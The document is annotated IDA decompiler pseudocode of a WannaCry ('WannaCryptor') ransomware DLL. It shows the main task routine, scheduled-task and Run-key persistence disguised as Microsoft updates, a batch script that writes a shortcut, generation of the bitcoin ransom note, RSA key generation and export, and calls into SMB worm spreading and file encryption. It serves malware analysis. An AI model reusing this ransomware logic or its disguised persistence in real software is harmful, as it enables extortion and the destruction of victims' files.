// payload.dll (decrypted t.wry) — IDA Hex-Rays pseudocode, batch 1
// database 452cf17ffd4f, imagebase 0x10000000

// ===== 0x10005ee0 StartTask =====
int __stdcall StartTask(HMODULE hModule, LPSECURITY_ATTRIBUTES lpThreadAttributes) {
  Filename[0] = word_1000EF38; memset(&Filename[1], 0, 518);
  GetModuleFileNameW(hModule, Filename, 0x103u);
  if ( wcsrchr(Filename, 0x5Cu) != nullptr ) *wcsrchr(Filename, 0x5Cu) = 0;
  SetCurrentDirectoryW(Filename);
  if ( sub_10005BB0() == 0 ) return 0;               // load c.wry config
  dword_1000F2E0 = sub_10001240();                    // is SYSTEM?
  sprintf(Buffer, "%08X.res", lpThreadAttributes);
  sprintf(FileName, "%08X.pky", lpThreadAttributes);
  sprintf(byte_1000F1B4, "%08X.eky", lpThreadAttributes);
  if ( sub_10004770(lpThreadAttributes) != 0 || sub_10004660(lpThreadAttributes) != 0 ) {
    // mutex exists OR .dky recovery key present -> decrypt-only path
    if ( lpThreadAttributes == nullptr && dword_1000F2E0 == 0 ) {
      Thread = CreateThread(nullptr, 0, sub_100049B0, nullptr, 0, nullptr);
      WaitForSingleObject(Thread, 0xFFFFFFFF); CloseHandle(Thread);
    }
    return 0;
  }
  sub_10001630(1);                                    // reg Software\WannaCryptor save cwd
  GetVersionExA(...);
  if ( VersionInformation[1] >= 6u && dword_1000F2E0 != 0 ) sub_10005CF0(); // schtasks persistence
  sub_10005C10();                                     // Run key persistence
  sub_10004CA0();                                     // drop u.wry -> decryptor exe + shortcut
  sub_10004DB0();                                     // write !Please Read Me!.txt from r.wry
  v2 = operator new(0x28u); v3 = sub_10003C40(v2);    // crypto object ctor
  if ( v3 == nullptr || sub_10003CF0((HCRYPTKEY)FileName, byte_1000F1B4) == 0 ) return 0; // RSA keygen -> .pky/.eky
  if ( sub_10004800() == 0 || dword_1000F1F0 != lpThreadAttributes ) {
    DeleteFileA(Buffer);                              // delete %08X.res
    sub_10004640(&pbBuffer, 8u);                      // random 8 bytes
  }
  sub_10003DE0(v3); (**v3)(v3, 1);                    // vtable call: save/export keys
  v4 = CreateThread(nullptr, 0, sub_100048C0, nullptr, 0, nullptr);  // worker thread
  Sleep(0x64u);
  if ( lpThreadAttributes != nullptr ) {              // /f <ip> mode
    sub_100057B0((struct in_addr)lpThreadAttributes, UserName, Password); // targeted SMB spread
    if ( v4 != nullptr ) { dword_1000F2DC = 1; WaitForSingleObject(v4, INFINITE); CloseHandle(v4); }
    if ( dword_1000F260 > 0 ) { sub_10004860(); return 0; }
    DeleteFileA(FileName); DeleteFileA(byte_1000F1B4); DeleteFileA(Buffer);
  } else {
    v5 = CreateThread(nullptr, 0, sub_10004730, nullptr, 0, nullptr); // worm scanner?
    if ( v5 != nullptr ) CloseHandle(v5);
    Sleep(0x64u);
    v6 = CreateThread(nullptr, 0, sub_10005720, nullptr, 0, nullptr); // worm spreader?
    Sleep(0x64u);
    if ( dword_1000F2E0 == 0 ) {
      v7 = CreateThread(nullptr, 0, sub_100049B0, nullptr, 0, nullptr); // decryptor GUI launcher
      if ( v7 != nullptr ) CloseHandle(v7);
      Sleep(0x64u);
    }
    sub_100058C0();                                   // main file encryption
    if ( v6 != nullptr ) { WaitForSingleObject(v6, INFINITE); CloseHandle(v6); return 0; }
  }
  return 0;
}

// ===== 0x10005bb0 sub_10005BB0 — load c.wry config =====
int sub_10005BB0() {
  v0 = fopen(aCWry, aRb); v1 = v0;
  if ( v0 != nullptr ) {
    if ( fread(&unk_1000EF40, 0x274u, 1u, v0) == 1 ) { fclose(v1); return 1; }
    fclose(v1);
  }
  return 0;
}

// ===== 0x10001240 sub_10001240 — running as SYSTEM? =====
BOOL sub_10001240() {
  Buffer[0] = word_1000EF38; memset(&Buffer[1], 0, 598);
  if ( sub_10001140(Buffer) != 0 ) { v0 = wcsicmp(aS1518, Buffer); }  // SID S-1-5-18
  else { pcbBuffer = 300; GetUserNameW(Buffer, &pcbBuffer); v0 = wcsicmp(Buffer, L"SYSTEM"); }
  return v0 == 0;
}

// ===== 0x10004770 sub_10004770 — single-instance mutex =====
int __cdecl sub_10004770(int a1) {
  v1 = OpenMutexA(0x100000u, true, Name);   // global mutex name string
  if ( v1 != nullptr ) { CloseHandle(v1); return 1; }
  sprintf(Buffer, "%s%d", aGlobalWindowsT_0, a1);
  MutexA = CreateMutexA(nullptr, true, Buffer);
  if ( MutexA != nullptr && GetLastError() == 183 ) { CloseHandle(MutexA); return 1; }
  sub_10001570(MutexA); return 0;
}

// ===== 0x10004660 sub_10004660 — .dky recovery-key check =====
int __cdecl sub_10004660(int a1) {
  sprintf(Buffer, "%08X.dky", a1);
  if ( GetFileAttributesA(Buffer) != -1 && GetFileAttributesA(FileName) != -1 ) {
    sub_10003C40(v2);
    if ( sub_10003F40(FileName, Buffer) != 0 ) { sub_10003C90(v2); return 1; }
    DeleteFileA(Buffer); sub_10003C90(v2);
  }
  return 0;
}

// ===== 0x10001630 sub_10001630 — Software\WannaCryptor working dir =====
int __cdecl sub_10001630(int a1) {
  qmemcpy(Destination, aSoftware, 0x14u);  // "Software\"
  wcscat((wchar_t *)Destination, L"WannaCryptor");
  // loop HKLM then HKCU: RegCreateKeyW
  // a1!=0: GetCurrentDirectoryA -> RegSetValueExA(ValueName)
  // a1==0: RegQueryValueExA -> SetCurrentDirectoryA(Buffer)
}

// ===== 0x10005cf0 sub_10005CF0 — scheduled task persistence (SYSTEM, Vista+) =====
int sub_10005CF0() {
  GetCurrentDirectoryA(0x207u, Buffer);
  strcat(Buffer, asc_1000E608); strcat(Buffer, a1Xml);   // "<cwd>\1.xml"
  v0 = fopen(Buffer, Mode);
  GetComputerNameA(v4,...); GetUserNameA(v6,...); GetModuleFileNameA(nullptr, Filename,...);
  sprintf(v5, aR);   // "/r"
  fprintf(v0, "<?xml ...><Task version=\"1.2\" ...>"
    "<RegistrationInfo><Author>Microsoft Windows</Author>"
    "<Description>This task keeps your Windows up to date with the latest enhancements and security fixes</Description></RegistrationInfo>"
    "<Triggers><TimeTrigger><Repetition><Interval>PT1M</Interval>...</Repetition>"
    "<StartBoundary>2001-01-01T00:00:00</StartBoundary>...</TimeTrigger></Triggers>"
    "<Principals><Principal id=\"Author\"><UserId>%s\\%s</UserId><LogonType>InteractiveToken</LogonType>"
    "<RunLevel>LeastPrivilege</RunLevel></Principal></Principals>...<WakeToRun>true</WakeToRun>..."
    "<Actions Context=\"Author\"><Exec><Command>\"%s\"</Command><Arguments>%s</Arguments></Exec></Actions></Task>",
    v4, v6, Filename, v5);
  fclose(v0);
  sprintf(CommandLine, "schtasks /create /xml \"%s\" /tn \"%s\" /f", Buffer, aMicrosoftUpdat);
  v2 = sub_10001000(CommandLine, 1, nullptr);   // hidden cmd exec
  DeleteFileA(Buffer);
  return v2;
}

// ===== 0x10005c10 sub_10005C10 — Run key persistence =====
LSTATUS sub_10005C10() {
  GetModuleFileNameA(nullptr, Filename, 0x104u);
  sprintf(Buffer, "\"%s\" /r", Filename);
  qmemcpy(SubKey, aSoftwareMicros, sizeof(SubKey));  // Software\Microsoft\Windows\CurrentVersion\Run
  v0 = sub_100012D0();   // admin check -> HKLM(0x80000002) else HKCU(0x80000001)
  result = RegOpenKeyExW(hive, SubKey, 0, 0xF003Fu, &phkResult);
  if ( result == 0 ) {
    RegSetValueExA(phkResult, aMicrosoftUpdat, 0, 1u, Buffer, strlen(Buffer)+1);
    return RegCloseKey(phkResult);
  }
  return result;
}

// ===== 0x10004ca0 sub_10004CA0 — drop decryptor + desktop shortcut =====
DWORD sub_10004CA0() {
  CopyFileA(aUWry, NewFileName, false);   // u.wry -> @WanaDecryptor@.exe
  result = GetFileAttributesA(aWannadecryptor_0);
  if ( result == -1 ) {
    strcpy(Format, "@echo off\r\n"
      "echo Set o = WScript.CreateObject(\"WScript.Shell\")> c.vbs\r\n"
      "echo Set ol = o.CreateShortcut(\"%s%s\")>> c.vbs\r\n"
      "echo ol.TargetPath = \"%s%s\">> c.vbs\r\n"
      "echo ol.Save>> c.vbs\r\n"
      "cscript //nologo c.vbs\r\n"
      "del c.vbs\r\n");
    GetCurrentDirectoryA(0x208u, Buffer);
    sprintf(v4, Format, Buffer, aWannadecryptor_0, Buffer, NewFileName);
    return sub_100010B0(v4);   // run batch
  }
  return result;
}

// ===== 0x10004db0 sub_10004DB0 — write ransom note txt =====
FILE *sub_10004DB0() {
  result = fopen(aRWry, aRb);   // r.wry
  if ( result != nullptr ) {
    fread(Buffer, 1u, 0x800u, result); fclose(result);
    result = wfopen(L"!Please Read Me!.txt", L"wb");
    if ( result != nullptr ) {
      if ( dword_1000EFBC != 0 ) sprintf(v3, "%.1f BTC", flt_1000EFB8);
      else sprintf(v3, "$%d worth of bitcoin", (unsigned int)flt_1000EFB8);  // $300
      sprintf(v5, Buffer, v3, &unk_1000EFF2, NewFileName, &unk_1000F150, &unk_1000EFC0);
      fwrite(v5, 1u, strlen(v5)+1, result);
      return fclose(result);
    }
  }
  return result;
}

// ===== 0x10003c40 sub_10003C40 — crypto object ctor =====
char *__thiscall sub_10003C40(char *this) {
  *((_DWORD *)this + 1) = 0; *((_DWORD *)this + 2) = 0; *((_DWORD *)this + 3) = 0;
  *(_DWORD *)this = &off_1000827C;   // vtable
  InitializeCriticalSection((LPCRITICAL_SECTION)(this + 16));
  return this;
}

// ===== 0x10003cf0 sub_10003CF0 — RSA keygen / import =====
int __thiscall sub_10003CF0(HCRYPTPROV *this, const CHAR *hPubKey, LPCSTR lpFileName) {
  if ( sub_10003CB0() == 0 ) goto FAIL;   // CryptAcquireContext
  if ( hPubKey != nullptr ) {             // generate new keypair, export .pky
    if ( sub_10003E30(hPubKey) == 0 ) {   // file exists?
      if ( !CryptImportKey(*(this+1), &byte_1000E00C, 0x114u, 0, 0, this+3)  // embedded RSA-2048 PUBLIC blob
        || sub_10004570(*(this+1), this+2) == 0      // CryptGenKey AT_KEYEXCHANGE
        || sub_10004270(*(this+1), *(this+2), 6u, hPubKey) == 0 ) goto FAIL;  // export PUBLICKEYBLOB -> .pky
      if ( lpFileName != nullptr ) sub_10003E70(lpFileName);  // export encrypted private -> .eky
      if ( sub_10003E30(hPubKey) == 0 ) goto FAIL;
    }
    v5 = *(this+3); if ( v5 != 0 ) CryptDestroyKey(v5);
  } else if ( !CryptImportKey(*(this+1), &pbData, 0x114u, 0, 0, this+2) ) { FAIL: sub_10003DE0(this); return 0; }
  return 1;
}
